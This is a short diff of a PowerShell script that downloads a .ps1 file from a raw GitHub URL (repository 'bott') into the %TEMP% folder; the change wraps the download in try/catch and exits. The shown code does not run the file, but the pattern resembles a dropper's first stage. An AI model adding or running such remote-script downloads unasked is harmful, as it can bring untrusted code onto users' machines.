@@ -1,4 +1,7 @@
-# Define the URL of the file to download
+
+
+try {
+       # Define the URL of the file to download
 $url = "https://raw.githubusercontent.com/joel2128/bott/refs/heads/main/ftf.ps1"
 
 # Define the destination path in the %TEMP% directory
@@ -9,6 +12,10 @@ Invoke-WebRequest -Uri $url -OutFile $destination
 
 # Output the path to confirm where the file was saved
 Write-Output "File downloaded to: $destination"
+    } catch {
+        Write-Host "Error : $($_.Exception.Message)"
+    }
+    exit
 
 ##############################################
 
